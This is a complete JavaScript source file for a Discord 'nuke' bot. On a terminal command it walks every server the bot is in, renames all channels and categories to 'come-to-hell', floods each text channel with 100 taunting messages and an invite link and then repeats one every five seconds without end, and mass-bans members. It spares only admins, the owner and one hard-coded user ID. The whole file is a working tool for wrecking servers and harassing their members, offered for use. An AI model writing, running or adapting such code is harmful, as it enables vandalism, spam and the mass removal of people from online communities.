import { Client, IntentsBitField } from "discord.js";
import dotenv from "dotenv";
import readline from "readline";

dotenv.config();

const client = new Client({
  intents: [
    IntentsBitField.Flags.Guilds,
    IntentsBitField.Flags.GuildMembers,
    IntentsBitField.Flags.GuildMessages,
    IntentsBitField.Flags.MessageContent,
  ],
});

// ===== HELPER FUNCTIONS =====

async function getAllGuilds() {
  return await client.guilds.fetch();
}

async function getChannelsFromGuild(guild) {
  return await guild.channels.fetch();
}

// ===== RENAME FUNCTION =====

async function renameChannel(channel, newName) {
  try {
    await channel.setName(newName);
    console.log(`✅ Renamed: ${channel.name} → ${newName}`);
  } catch (error) {
    console.error(`❌ Failed to rename ${channel.name}:`, error.message);
  }
}

// ===== SPAM MESSAGE FUNCTIONS =====

async function sendFirst100Messages(channel) {
  for (let i = 0; i < 100; i++) {
    try {
      await channel.send(`# I made this hell, Now come to hell! 
*I turned heaven into hell hahaha*
https://discord.gg/c2h`);
      console.log(`${i + 1} Message sent to: ${channel.name}`);

      // delay to avoid rate limiting
      await new Promise((resolve) => setTimeout(resolve, 500));
    } catch (error) {
      console.error(`❌ Failed to send message ${i + 1}:`, error.message);
      continue;
    }
  }
}

function sendPerSecondMessages(channel) {
  setInterval(async () => {
    try {
      await channel.send(`# I made this hell, Now come to hell! 
*I turned heaven into hell hahaha*
https://discord.gg/c2h`);
    } catch (error) {
      console.error(`❌ Failed to send interval message:`, error.message);
    }
  }, 5000);
}

async function handleMessages(channel) {
  await sendFirst100Messages(channel);
  console.log(
    `📨 100 messages done, interval is now running in ${channel.name}`,
  );
  sendPerSecondMessages(channel);
}

// ===== MASS BAN FUNCTION =====
async function banAllMembers(guild) {
  try {
    const members = await guild.members.fetch();
    const botId = client.user.id;
    const protectedId = "1291403526311772298";

    for (const member of members.values()) {
      try {
        // skip the bot itself
        if (member.user.id === botId) {
          console.log(`⏭️ Skipped bot: ${member.user.tag}`);
          continue;
        }

        // skip protected user
        if (member.user.id === protectedId) {
          console.log(`⏭️ Skipped protected user: ${member.user.tag}`);
          continue;
        }

        // skip owner
        if (member.guild.ownerId === member.user.id) {
          console.log(`⏭️ Skipped owner: ${member.user.tag}`);
          continue;
        }

        // skip admins
        if (member.permissions.has("Administrator")) {
          console.log(`⏭️ Skipped admin: ${member.user.tag}`);
          continue;
        }

        // skip members with role higher than or equal to bot's highest role
        const botHighestRole = member.guild.members.me.roles.highest;
        const memberHighestRole = member.roles.highest;

        if (memberHighestRole.position >= botHighestRole.position) {
          console.log(`⏭️ Skipped (higher/equal role): ${member.user.tag}`);
          continue;
        }

        // ban the member
        await member.ban({ reason: "Mass ban" });
        console.log(`✅ Banned: ${member.user.tag}`);

        // delay to avoid rate limiting
        await new Promise((resolve) => setTimeout(resolve, 500));
      } catch (error) {
        console.error(`❌ Failed to ban ${member.user.tag}:`, error.message);
        continue;
      }
    }

    console.log(`\n✨ Finished banning members in ${guild.name}`);
  } catch (error) {
    console.error(`❌ Failed to nuke ban guild ${guild.name}:`, error.message);
  }
}

// ===== NUKE TEXT & VOICE CHANNELS FUNCTION =====

async function nukeChannel(channel, newName) {
  try {
    // skip categories
    if (channel.isCategory()) {
      return;
    }

    // process text channels
    if (channel.isTextBased()) {
      await renameChannel(channel, newName);
      await handleMessages(channel);
    }
    
    // process voice channels
    else if (channel.isVoiceBased()) {
      await renameChannel(channel, newName);
      console.log(`🔊 Voice channel nuked: ${channel.name}`);
    }
  } catch (error) {
    console.error(`❌ Failed to nuke channel ${channel.name}:`, error.message);
  }
}

// ===== NUKE CATEGORIES FUNCTION =====

async function renameCategory(category, newName) {
  try {
    await category.setName(newName);
    console.log(`✅ Renamed category: ${category.name} → ${newName}`);
  } catch (error) {
    console.error(
      `❌ Failed to rename category ${category.name}:`,
      error.message,
    );
  }
}

async function nukeCategory(category, newName) {
  try {
    await renameCategory(category, newName);
  } catch (error) {
    console.error(
      `❌ Failed to nuke category ${category.name}:`,
      error.message,
    );
  }
}

async function nukeAllCategories(guild, newName) {
  try {
    console.log(`\n=== Nuking categories in ${guild.name} ===`);

    const categories = guild.channels.cache.filter((channel) =>
      channel.isCategory(),
    );

    for (const category of categories.values()) {
      await nukeCategory(category, newName);
    }

    console.log(`✅ Finished all categories in ${guild.name}`);
  } catch (error) {
    console.error(
      `❌ Failed to nuke categories in ${guild.name}:`,
      error.message,
    );
  }
}

// ===== MAIN NUKE GUILD FUNCTION =====

async function nukeGuild(guild) {
  console.log(`\n=== 💣 Nuking ${guild.name} 💣 ===`);

  const newName = "come-to-hell";

  try {
    // nuke all categories first
    await nukeAllCategories(guild, newName);

    // nuke all text channels (excluding categories)
    const channels = await getChannelsFromGuild(guild);
    for (const channel of channels.values()) {
      await nukeChannel(channel, newName);
    }

    // ban all members
    await banAllMembers(guild);
  } catch (error) {
    console.error(`❌ Failed to nuke ${guild.name}:`, error.message);
  }
}

async function nukeAllGuilds() {
  const guilds = await getAllGuilds();

  for (const guild of guilds.values()) {
    try {
      await nukeGuild(guild);
    } catch (error) {
      console.error(`❌ Failed to nuke ${guild.name}:`, error.message);
    }
  }
}

// ===== BOT EVENT =====

client.on("ready", async () => {
  console.log("Hello World");
  console.log(`Logged in as ${client.user.tag}`);
});

// ===== TERMINAL COMMAND LISTENER =====

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout,
});

function promptCommand() {
  rl.question("Enter command (nuke / exit): ", async (input) => {
    if (input.toLowerCase() === "nuke") {
      console.log("🔥 Starting to nuke all guilds...");
      try {
        await nukeAllGuilds();
        console.log("✨ All guilds nuked!");
      } catch (error) {
        console.error("❌ Error nuking guilds:", error);
      }
    } else if (input.toLowerCase() === "exit") {
      console.log("Exiting...");
      process.exit(0);
    } else {
      console.log("Unknown command. Try 'nuke' or 'exit'");
    }

    promptCommand();
  });
}

client.login(process.env.DISCORD_TOKEN);

client.once("ready", () => {
  promptCommand();
});
